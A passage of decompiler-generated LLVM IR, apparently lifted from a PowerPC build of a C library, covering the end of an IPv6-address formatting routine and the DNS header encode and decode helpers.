  %v1_1000a234 = icmp slt i32 %v0_1000a234, 0
  %v3_1000a234 = icmp eq i32 %v0_1000a234, 0
  store i1 %v1_1000a234, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a234, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a234, label %dec_label_pc_1000a23c, label %dec_label_pc_1000a290

dec_label_pc_1000a23c:                            ; preds = %dec_label_pc_1000a234
  %v0_1000a23c = load i32, i32* @r30, align 4
  %v1_1000a23c = icmp slt i32 %v0_1000a23c, 6
  %v3_1000a23c = icmp eq i32 %v0_1000a23c, 6
  store i1 %v1_1000a23c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a23c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a23c, label %dec_label_pc_1000a260, label %dec_label_pc_1000a244

dec_label_pc_1000a244:                            ; preds = %dec_label_pc_1000a23c
  %v1_1000a244 = icmp slt i32 %v0_1000a23c, 5
  %v3_1000a244 = icmp eq i32 %v0_1000a23c, 5
  store i1 %v1_1000a244, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a244, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a244, label %dec_label_pc_1000a24c, label %dec_label_pc_1000a290

dec_label_pc_1000a24c:                            ; preds = %dec_label_pc_1000a244
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1000a258, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a258, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000a258, label %dec_label_pc_1000a260, label %dec_label_pc_1000a290

dec_label_pc_1000a260:                            ; preds = %dec_label_pc_1000a24c, %dec_label_pc_1000a23c
  %v1_1000a260 = load i32, i32* @r1, align 4
  %v2_1000a260 = sub i32 %v1_1000a260, %v1_1000a228
  %v0_1000a264 = load i32, i32* @r27, align 4
  %v1_1000a264 = add i32 %v0_1000a264, 12
  %v1_1000a268 = add i32 %v2_1000a260, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1000a274.476 to i32), i32* @lr, align 4
  %v3_1000a270 = call i32 @inet_ntop4(i32 %v1_1000a264, i32 %v1_1000a228, i32 %v1_1000a268)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000a278 = icmp slt i32 %v3_1000a270, 0
  %v3_1000a278 = icmp eq i32 %v3_1000a270, 0
  store i1 %v1_1000a278, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a278, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a278, label %dec_label_pc_1000a330, label %dec_label_pc_1000a280

dec_label_pc_1000a280:                            ; preds = %dec_label_pc_1000a260
  %v0_1000a280 = load i32, i32* @r29, align 4
  store i32 %v0_1000a280, i32* @r3, align 4
  %v0_1000a284 = call i32 @__GI_strlen()
  %v0_1000a288 = load i32, i32* @r29, align 4
  %v2_1000a288 = add i32 %v0_1000a288, %v0_1000a284
  store i32 %v2_1000a288, i32* %r29.global-to-local, align 4
  %v0_1000a2c8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000a2c8

dec_label_pc_1000a290:                            ; preds = %dec_label_pc_1000a22c.thread, %dec_label_pc_1000a24c, %dec_label_pc_1000a244, %dec_label_pc_1000a234, %dec_label_pc_1000a22c
  %v0_1000a29067 = phi i32 [ 0, %dec_label_pc_1000a22c.thread ], [ 6, %dec_label_pc_1000a24c ], [ 6, %dec_label_pc_1000a244 ], [ 6, %dec_label_pc_1000a234 ], [ %v0_1000a22c.pre, %dec_label_pc_1000a22c ]
  %v0_1000a26c66 = phi i32 [ %v2_1000a224, %dec_label_pc_1000a22c.thread ], [ %v1_1000a228, %dec_label_pc_1000a24c ], [ %v1_1000a228, %dec_label_pc_1000a244 ], [ %v1_1000a228, %dec_label_pc_1000a234 ], [ %v1_1000a228, %dec_label_pc_1000a22c ]
  %v1_1000a290 = mul i32 %v0_1000a29067, 4
  store i32 %v2_1000a0e8, i32* %r9.global-to-local, align 4
  %v2_1000a298 = add i32 %v1_1000a290, %v2_1000a0e8
  %v3_1000a298 = inttoptr i32 %v2_1000a298 to i32*
  %v4_1000a298 = load i32, i32* %v3_1000a298, align 4
  store i32 %v0_1000a26c66, i32* @r3, align 4
  store i32 268477104, i32* @lr, align 4
  %v5_1000a2ac = load i32, i32* @r7, align 4
  %v6_1000a2ac = call i32 @sprintf(i32 %v0_1000a26c66, i32 ptrtoint ([3 x i8]* @global_var_1000d01c.477 to i32), i32 %v4_1000a298, i32 %v2_1000a0e8, i32 %v5_1000a2ac)
  %v0_1000a2b0 = load i32, i32* @r29, align 4
  %v2_1000a2b0 = add i32 %v0_1000a2b0, %v6_1000a2ac
  store i32 %v2_1000a2b0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000a2b4

dec_label_pc_1000a2b4:                            ; preds = %dec_label_pc_1000a204, %dec_label_pc_1000a208, %dec_label_pc_1000a290
  %v2_1000a20c51 = phi i32 [ %v2_1000a224, %dec_label_pc_1000a204 ], [ %v1_1000a210, %dec_label_pc_1000a208 ], [ %v2_1000a2b0, %dec_label_pc_1000a290 ]
  %v0_1000a2b4 = load i32, i32* @r31, align 4
  %v1_1000a2b4 = add i32 %v0_1000a2b4, 1
  store i32 %v1_1000a2b4, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1000a2b4, 8
  %v0_1000a1e8 = load i32, i32* @r28, align 4
  %v1_1000a1e8 = icmp slt i32 %v0_1000a1e8, -1
  %v3_1000a1e8 = icmp eq i32 %v0_1000a1e8, -1
  store i1 %v1_1000a1e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1000a1e8, label %dec_label_pc_1000a2c0

dec_label_pc_1000a2c0:                            ; preds = %dec_label_pc_1000a2b4
  br i1 %v3_1000a1e8, label %dec_label_pc_1000a2e0, label %dec_label_pc_1000a2c8

dec_label_pc_1000a2c8:                            ; preds = %dec_label_pc_1000a2c0, %dec_label_pc_1000a280
  %v2_1000a2d8 = phi i32 [ %v2_1000a20c51, %dec_label_pc_1000a2c0 ], [ %v2_1000a288, %dec_label_pc_1000a280 ]
  %v0_1000a2c8 = phi i32 [ %v0_1000a1e8, %dec_label_pc_1000a2c0 ], [ %v0_1000a2c8.pre, %dec_label_pc_1000a280 ]
  %v1_1000a2c8 = load i32, i32* @r30, align 4
  %v2_1000a2c8 = add i32 %v1_1000a2c8, %v0_1000a2c8
  %v1_1000a2cc = icmp slt i32 %v2_1000a2c8, 8
  %v3_1000a2cc = icmp eq i32 %v2_1000a2c8, 8
  store i1 %v1_1000a2cc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a2cc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a2cc, label %dec_label_pc_1000a2d4, label %dec_label_pc_1000a2e0

dec_label_pc_1000a2d4:                            ; preds = %dec_label_pc_1000a2c8
  %v3_1000a2d8 = inttoptr i32 %v2_1000a2d8 to i8*
  store i8 58, i8* %v3_1000a2d8, align 1
  %v0_1000a2dc = load i32, i32* %r29.global-to-local, align 4
  %v1_1000a2dc = add i32 %v0_1000a2dc, 1
  store i32 %v1_1000a2dc, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000a2e0

dec_label_pc_1000a2e0:                            ; preds = %dec_label_pc_1000a2c8, %dec_label_pc_1000a2c0, %dec_label_pc_1000a2d4
  %v2_1000a2f4 = phi i32 [ %v2_1000a2d8, %dec_label_pc_1000a2c8 ], [ %v2_1000a20c51, %dec_label_pc_1000a2c0 ], [ %v1_1000a2dc, %dec_label_pc_1000a2d4 ]
  %v1_1000a2e0 = sub i32 1, %v2_1000a1dc
  %v2_1000a2e8 = add i32 %v1_1000a2e0, %v2_1000a2f4
  %v1_1000a2ec = load i32, i32* @r26, align 4
  %v2_1000a2ec = icmp ult i32 %v2_1000a2e8, %v1_1000a2ec
  %v4_1000a2ec = icmp eq i32 %v2_1000a2e8, %v1_1000a2ec
  store i1 %v2_1000a2ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a2ec, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a2f4 = inttoptr i32 %v2_1000a2f4 to i8*
  store i8 0, i8* %v3_1000a2f4, align 1
  %v0_1000a2f8 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a2f8 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000a2f8 = or i1 %v0_1000a2f8, %v1_1000a2f8
  br i1 %v2_1000a2f8, label %dec_label_pc_1000a310, label %dec_label_pc_1000a2fc

dec_label_pc_1000a2fc:                            ; preds = %dec_label_pc_1000a2e0
  %v0_1000a2fc = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000a308 = inttoptr i32 %v0_1000a2fc to i32*
  store i32 28, i32* %v2_1000a308, align 4
  %v0_1000a334.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a330

dec_label_pc_1000a310:                            ; preds = %dec_label_pc_1000a2e0
  %v0_1000a310 = load i32, i32* @r25, align 4
  %v2_1000a314 = bitcast i32* %stack_var_-88 to i8*
  %v3_1000a314 = call i32 @strcpy(i32 %v0_1000a310, i8* %v2_1000a314)
  br label %dec_label_pc_1000a318

dec_label_pc_1000a318:                            ; preds = %dec_label_pc_1000a0d4, %dec_label_pc_1000a310
  %storemerge1 = phi i32 [ %v3_1000a0e0, %dec_label_pc_1000a0d4 ], [ %v3_1000a314, %dec_label_pc_1000a310 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a330

dec_label_pc_1000a320:                            ; preds = %dec_label_pc_1000a0c8
  %v0_1000a320 = call i32 @__errno_location()
  %v2_1000a328 = inttoptr i32 %v0_1000a320 to i32*
  store i32 97, i32* %v2_1000a328, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a330

dec_label_pc_1000a330:                            ; preds = %dec_label_pc_1000a260, %dec_label_pc_1000a318, %dec_label_pc_1000a2fc, %dec_label_pc_1000a320
  %v0_1000a334 = phi i32 [ 0, %dec_label_pc_1000a260 ], [ %storemerge1, %dec_label_pc_1000a318 ], [ %v0_1000a334.pre, %dec_label_pc_1000a2fc ], [ 0, %dec_label_pc_1000a320 ]
  ret i32 %v0_1000a334

; uselistorder directives
  uselistorder i32 %v2_1000a2f4, { 1, 0 }
  uselistorder i32 %v2_1000a2c8, { 1, 0 }
  uselistorder i1 %v3_1000a1e8, { 0, 2, 1 }
  uselistorder i32 %v0_1000a1e8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000a2b4, { 2, 1, 0 }
  uselistorder i32 %v0_1000a26c66, { 1, 0 }
  uselistorder i32 %v3_1000a270, { 1, 0 }
  uselistorder i32 %v0_1000a23c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000a22c.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1000a228, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1000a1f8, { 1, 0 }
  uselistorder i32 %v0_1000a218, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1000a1f8, { 0, 2, 1 }
  uselistorder i32 %v2_1000a224, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000a1e83, { 0, 2, 1 }
  uselistorder i32 %v0_1000a1d0, { 2, 1, 0 }
  uselistorder i32 %v0_1000a1c0.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1000a1c8, { 1, 0, 2 }
  uselistorder i32 %v1_1000a1a4, { 2, 1, 0 }
  uselistorder i32 %v1_1000a1a0, { 1, 0 }
  uselistorder i32 %v0_1000a18439, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1000a19442, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1000a158, { 1, 0 }
  uselistorder i32 %v0_1000a1a0, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1000a158, { 1, 0 }
  uselistorder i32 %v0_1000a184, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1000a194, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000a134, { 1, 0 }
  uselistorder i32 %v2_1000a12c, { 1, 0 }
  uselistorder i32 %v0_1000a124, { 1, 0, 2 }
  uselistorder i32 %v1_1000a10c, { 1, 0 }
  uselistorder i32 %v2_1000a0e8, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 17, 9, 10, 16, 12, 19, 14, 13, 15, 18 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 17, 9, 10, 16, 12, 19, 14, 13, 15, 18 }
  uselistorder i32 97, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @sprintf, { 1, 0 }
  uselistorder i32* @r7, { 10, 15, 16, 17, 0, 18, 19, 20, 21, 1, 22, 23, 6, 24, 25, 26, 27, 2, 28, 29, 30, 8, 31, 32, 33, 34, 35, 36, 37, 38, 3, 39, 7, 4, 5, 40, 41, 9, 12, 13, 14, 11 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 5, 0, 6, 10, 11, 7, 8, 9, 12 }
  uselistorder i1 true, { 3, 0, 4, 5, 1, 2 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5 }
  uselistorder i32 65535, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 13, 12, 7, 2, 6, 5, 4, 0, 1, 3, 11, 10, 9, 8 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000a330, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a318, { 1, 0 }
  uselistorder label %dec_label_pc_1000a2e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a2b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a290, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000a1e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a1c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1a0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000a19c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a154, { 1, 0 }
  uselistorder label %dec_label_pc_1000a10c, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_1000a42c, label %dec_label_pc_1000a354

dec_label_pc_1000a354:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_1000a354 = add i32 %tmp, 2
  %v2_1000a354 = inttoptr i32 %v1_1000a354 to i8*
  %v3_1000a354 = load i8, i8* %v2_1000a354, align 1
  %v4_1000a354 = zext i8 %v3_1000a354 to i32
  store i32 %v4_1000a354, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_1000a354, i8* %tmp3, align 1
  %v2_1000a360 = load i32, i32* %arg1, align 4
  store i32 %v2_1000a360, i32* %r0.global-to-local, align 4
  %v1_1000a364 = trunc i32 %v2_1000a360 to i8
  %v4_1000a364 = add i32 %arg2, 1
  %v5_1000a364 = inttoptr i32 %v4_1000a364 to i8*
  store i8 %v1_1000a364, i8* %v5_1000a364, align 1
  %v1_1000a368 = add i32 %tmp, 12
  %v2_1000a368 = inttoptr i32 %v1_1000a368 to i32*
  %v3_1000a368 = load i32, i32* %v2_1000a368, align 4
  store i32 %v3_1000a368, i32* %r0.global-to-local, align 4
  %v1_1000a36c = add i32 %tmp, 16
  %v2_1000a36c = inttoptr i32 %v1_1000a36c to i32*
  %v3_1000a36c = load i32, i32* %v2_1000a36c, align 4
  store i32 %v3_1000a36c, i32* %r11.global-to-local, align 4
  %v1_1000a370 = add i32 %tmp, 4
  %v2_1000a370 = inttoptr i32 %v1_1000a370 to i32*
  %v3_1000a370 = load i32, i32* %v2_1000a370, align 4
  %v2_1000a374 = icmp ne i32 %v3_1000a368, 0
  %v5_1000a378 = zext i1 %v2_1000a374 to i32
  store i32 %v5_1000a378, i32* %r10.global-to-local, align 4
  %v1_1000a37c = add i32 %tmp, 8
  %v2_1000a37c = inttoptr i32 %v1_1000a37c to i32*
  %v3_1000a37c = load i32, i32* %v2_1000a37c, align 4
  %v2_1000a380 = icmp ne i32 %v3_1000a36c, 0
  %v5_1000a384 = zext i1 %v2_1000a380 to i32
  %v1_1000a388 = add i32 %tmp, 20
  %v2_1000a388 = inttoptr i32 %v1_1000a388 to i32*
  %v3_1000a388 = load i32, i32* %v2_1000a388, align 4
  store i32 %v3_1000a388, i32* %r0.global-to-local, align 4
  %not.v2_1000a38c = icmp eq i32 %v3_1000a370, 0
  %v6_1000a390 = sext i1 %not.v2_1000a38c to i32
  store i32 %v5_1000a384, i32* %r11.global-to-local, align 4
  %v1_1000a398 = call i32 @__asm_rlwinm(i32 %v6_1000a390, i32 0, i32 24, i32 24)
  %v0_1000a39c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a39c = mul i32 %v0_1000a39c, 4
  store i32 %v1_1000a39c, i32* %r10.global-to-local, align 4
  %v1_1000a3a0 = call i32 @__asm_rlwinm(i32 %v3_1000a37c, i32 3, i32 25, i32 28)
  %v0_1000a3a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000a3a4 = icmp ne i32 %v0_1000a3a4, 0
  %v5_1000a3a8 = zext i1 %v2_1000a3a4 to i32
  %v2_1000a3ac = or i32 %v1_1000a39c, %v1_1000a3a0
  store i32 %v2_1000a3ac, i32* %r10.global-to-local, align 4
  %v1_1000a3b0 = add i32 %v1_1000a398, 128
  %v0_1000a3b4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a3b4 = mul i32 %v0_1000a3b4, 2
  store i32 %v1_1000a3b4, i32* %r11.global-to-local, align 4
  %v2_1000a3b8 = or i32 %v2_1000a3ac, %v5_1000a3a8
  store i32 %v2_1000a3b8, i32* %r0.global-to-local, align 4
  %v2_1000a3bc = or i32 %v2_1000a3b8, %v1_1000a3b0
  %v2_1000a3c0 = or i32 %v2_1000a3bc, %v1_1000a3b4
  %v1_1000a3c4 = trunc i32 %v2_1000a3c0 to i8
  %v4_1000a3c4 = add i32 %arg2, 2
  %v5_1000a3c4 = inttoptr i32 %v4_1000a3c4 to i8*
  store i8 %v1_1000a3c4, i8* %v5_1000a3c4, align 1
  %v1_1000a3c8 = add i32 %tmp, 24
  %v2_1000a3c8 = inttoptr i32 %v1_1000a3c8 to i32*
  %v3_1000a3c8 = load i32, i32* %v2_1000a3c8, align 4
  %v1_1000a3cc = add i32 %tmp, 28
  %v2_1000a3cc = inttoptr i32 %v1_1000a3cc to i32*
  %v3_1000a3cc = load i32, i32* %v2_1000a3cc, align 4
  store i32 %v3_1000a3cc, i32* %r0.global-to-local, align 4
  %not.v2_1000a3d0 = icmp eq i32 %v3_1000a3c8, 0
  %v6_1000a3d4 = sext i1 %not.v2_1000a3d0 to i32
  %v1_1000a3d8 = call i32 @__asm_rlwinm(i32 %v6_1000a3d4, i32 0, i32 24, i32 24)
  %v1_1000a3dc = urem i32 %v3_1000a3cc, 16
  store i32 %v1_1000a3dc, i32* %r0.global-to-local, align 4
  %v1_1000a3e0 = add i32 %v1_1000a3d8, 128
  %v2_1000a3e4 = or i32 %v1_1000a3dc, %v1_1000a3e0
  %v1_1000a3e8 = trunc i32 %v2_1000a3e4 to i8
  %v4_1000a3e8 = add i32 %arg2, 3
  %v5_1000a3e8 = inttoptr i32 %v4_1000a3e8 to i8*
  store i8 %v1_1000a3e8, i8* %v5_1000a3e8, align 1
  %v1_1000a3ec = add i32 %tmp, 34
  %v2_1000a3ec = inttoptr i32 %v1_1000a3ec to i8*
  %v3_1000a3ec = load i8, i8* %v2_1000a3ec, align 1
  %v4_1000a3ec = zext i8 %v3_1000a3ec to i32
  store i32 %v4_1000a3ec, i32* %r0.global-to-local, align 4
  %v4_1000a3f0 = add i32 %arg2, 4
  %v5_1000a3f0 = inttoptr i32 %v4_1000a3f0 to i8*
  store i8 %v3_1000a3ec, i8* %v5_1000a3f0, align 1
  %v1_1000a3f4 = add i32 %tmp, 32
  %v2_1000a3f4 = inttoptr i32 %v1_1000a3f4 to i32*
  %v3_1000a3f4 = load i32, i32* %v2_1000a3f4, align 4
  store i32 %v3_1000a3f4, i32* %r0.global-to-local, align 4
  %v1_1000a3f8 = trunc i32 %v3_1000a3f4 to i8
  %v4_1000a3f8 = add i32 %arg2, 5
  %v5_1000a3f8 = inttoptr i32 %v4_1000a3f8 to i8*
  store i8 %v1_1000a3f8, i8* %v5_1000a3f8, align 1
  %v1_1000a3fc = add i32 %tmp, 38
  %v2_1000a3fc = inttoptr i32 %v1_1000a3fc to i8*
  %v3_1000a3fc = load i8, i8* %v2_1000a3fc, align 1
  %v4_1000a3fc = zext i8 %v3_1000a3fc to i32
  store i32 %v4_1000a3fc, i32* %r0.global-to-local, align 4
  %v4_1000a400 = add i32 %arg2, 6
  %v5_1000a400 = inttoptr i32 %v4_1000a400 to i8*
  store i8 %v3_1000a3fc, i8* %v5_1000a400, align 1
  %v1_1000a404 = add i32 %tmp, 36
  %v2_1000a404 = inttoptr i32 %v1_1000a404 to i32*
  %v3_1000a404 = load i32, i32* %v2_1000a404, align 4
  store i32 %v3_1000a404, i32* %r0.global-to-local, align 4
  %v1_1000a408 = trunc i32 %v3_1000a404 to i8
  %v4_1000a408 = add i32 %arg2, 7
  %v5_1000a408 = inttoptr i32 %v4_1000a408 to i8*
  store i8 %v1_1000a408, i8* %v5_1000a408, align 1
  %v1_1000a40c = add i32 %tmp, 42
  %v2_1000a40c = inttoptr i32 %v1_1000a40c to i8*
  %v3_1000a40c = load i8, i8* %v2_1000a40c, align 1
  %v4_1000a40c = zext i8 %v3_1000a40c to i32
  store i32 %v4_1000a40c, i32* %r0.global-to-local, align 4
  %v4_1000a410 = add i32 %arg2, 8
  %v5_1000a410 = inttoptr i32 %v4_1000a410 to i8*
  store i8 %v3_1000a40c, i8* %v5_1000a410, align 1
  %v1_1000a414 = add i32 %tmp, 40
  %v2_1000a414 = inttoptr i32 %v1_1000a414 to i32*
  %v3_1000a414 = load i32, i32* %v2_1000a414, align 4
  store i32 %v3_1000a414, i32* %r0.global-to-local, align 4
  %v1_1000a418 = trunc i32 %v3_1000a414 to i8
  %v4_1000a418 = add i32 %arg2, 9
  %v5_1000a418 = inttoptr i32 %v4_1000a418 to i8*
  store i8 %v1_1000a418, i8* %v5_1000a418, align 1
  %v1_1000a41c = add i32 %tmp, 46
  %v2_1000a41c = inttoptr i32 %v1_1000a41c to i8*
  %v3_1000a41c = load i8, i8* %v2_1000a41c, align 1
  %v4_1000a41c = zext i8 %v3_1000a41c to i32
  store i32 %v4_1000a41c, i32* %r0.global-to-local, align 4
  %v4_1000a420 = add i32 %arg2, 10
  %v5_1000a420 = inttoptr i32 %v4_1000a420 to i8*
  store i8 %v3_1000a41c, i8* %v5_1000a420, align 1
  %v1_1000a424 = add i32 %tmp, 44
  %v2_1000a424 = inttoptr i32 %v1_1000a424 to i32*
  %v3_1000a424 = load i32, i32* %v2_1000a424, align 4
  store i32 %v3_1000a424, i32* %r0.global-to-local, align 4
  %v1_1000a428 = trunc i32 %v3_1000a424 to i8
  %v4_1000a428 = add i32 %arg2, 11
  %v5_1000a428 = inttoptr i32 %v4_1000a428 to i8*
  store i8 %v1_1000a428, i8* %v5_1000a428, align 1
  %v0_1000a42c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000a42c

dec_label_pc_1000a42c:                            ; preds = %entry, %dec_label_pc_1000a354
  %v0_1000a42c = phi i32 [ -1, %entry ], [ %v0_1000a42c.pre, %dec_label_pc_1000a354 ]
  ret i32 %v0_1000a42c

; uselistorder directives
  uselistorder i32 %v1_1000a3dc, { 1, 0 }
  uselistorder i32 %v1_1000a3b4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder label %dec_label_pc_1000a42c, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1000a434 = load i8, i8* %arg1, align 1
  %v4_1000a434 = zext i8 %v3_1000a434 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_1000a43c = add i32 %tmp, 1
  %v3_1000a43c = inttoptr i32 %v2_1000a43c to i8*
  %v4_1000a43c = load i8, i8* %v3_1000a43c, align 1
  %v5_1000a43c = zext i8 %v4_1000a43c to i32
  %v1_1000a444 = mul nuw nsw i32 %v4_1000a434, 256
  %v2_1000a448 = or i32 %v5_1000a43c, %v1_1000a444
  %v2_1000a44c = inttoptr i32 %arg2 to i32*
  store i32 %v2_1000a448, i32* %v2_1000a44c, align 4
  %v0_1000a450 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a450 = add i32 %v0_1000a450, 2
  %v2_1000a450 = inttoptr i32 %v1_1000a450 to i8*
  %v3_1000a450 = load i8, i8* %v2_1000a450, align 1
  %v4_1000a450 = zext i8 %v3_1000a450 to i32
  %v1_1000a454 = call i32 @__asm_rlwinm(i32 %v4_1000a450, i32 25, i32 31, i32 31)
  %v2_1000a458 = add i32 %arg2, 4
  %v3_1000a458 = inttoptr i32 %v2_1000a458 to i32*
  store i32 %v1_1000a454, i32* %v3_1000a458, align 4
  %v0_1000a45c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a45c = add i32 %v0_1000a45c, 2
  %v2_1000a45c = inttoptr i32 %v1_1000a45c to i8*
  %v3_1000a45c = load i8, i8* %v2_1000a45c, align 1
  %v4_1000a45c = zext i8 %v3_1000a45c to i32
  %v1_1000a460 = call i32 @__asm_rlwinm(i32 %v4_1000a45c, i32 29, i32 28, i32 31)
  %v2_1000a464 = add i32 %arg2, 8
  %v3_1000a464 = inttoptr i32 %v2_1000a464 to i32*
  store i32 %v1_1000a460, i32* %v3_1000a464, align 4
  %v0_1000a468 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a468 = add i32 %v0_1000a468, 2
  %v2_1000a468 = inttoptr i32 %v1_1000a468 to i8*
  %v3_1000a468 = load i8, i8* %v2_1000a468, align 1
  %v4_1000a468 = zext i8 %v3_1000a468 to i32
  %v1_1000a46c = call i32 @__asm_rlwinm(i32 %v4_1000a468, i32 30, i32 31, i32 31)
  %v2_1000a470 = add i32 %arg2, 12
  %v3_1000a470 = inttoptr i32 %v2_1000a470 to i32*
  store i32 %v1_1000a46c, i32* %v3_1000a470, align 4
  %v0_1000a474 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a474 = add i32 %v0_1000a474, 2
  %v2_1000a474 = inttoptr i32 %v1_1000a474 to i8*
  %v3_1000a474 = load i8, i8* %v2_1000a474, align 1
  %v4_1000a474 = zext i8 %v3_1000a474 to i32
  %v1_1000a478 = call i32 @__asm_rlwinm(i32 %v4_1000a474, i32 31, i32 31, i32 31)
  %v2_1000a47c = add i32 %arg2, 16
  %v3_1000a47c = inttoptr i32 %v2_1000a47c to i32*
  store i32 %v1_1000a478, i32* %v3_1000a47c, align 4
  %v0_1000a480 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a480 = add i32 %v0_1000a480, 2
  %v2_1000a480 = inttoptr i32 %v1_1000a480 to i8*
  %v3_1000a480 = load i8, i8* %v2_1000a480, align 1
  %tmp1 = urem i8 %v3_1000a480, 2
  %v1_1000a484 = zext i8 %tmp1 to i32
  %v2_1000a488 = add i32 %arg2, 20
  %v3_1000a488 = inttoptr i32 %v2_1000a488 to i32*
  store i32 %v1_1000a484, i32* %v3_1000a488, align 4
  %v0_1000a48c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a48c = add i32 %v0_1000a48c, 3
  %v2_1000a48c = inttoptr i32 %v1_1000a48c to i8*
  %v3_1000a48c = load i8, i8* %v2_1000a48c, align 1
  %v4_1000a48c = zext i8 %v3_1000a48c to i32
  %v1_1000a490 = call i32 @__asm_rlwinm(i32 %v4_1000a48c, i32 25, i32 31, i32 31)
  %v2_1000a494 = add i32 %arg2, 24
  %v3_1000a494 = inttoptr i32 %v2_1000a494 to i32*
  store i32 %v1_1000a490, i32* %v3_1000a494, align 4
  %v0_1000a498 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a498 = add i32 %v0_1000a498, 3
  %v2_1000a498 = inttoptr i32 %v1_1000a498 to i8*
  %v3_1000a498 = load i8, i8* %v2_1000a498, align 1
  %tmp2 = urem i8 %v3_1000a498, 16
  %v1_1000a49c = zext i8 %tmp2 to i32
  %v2_1000a4a0 = add i32 %arg2, 28
  %v3_1000a4a0 = inttoptr i32 %v2_1000a4a0 to i32*
  store i32 %v1_1000a49c, i32* %v3_1000a4a0, align 4
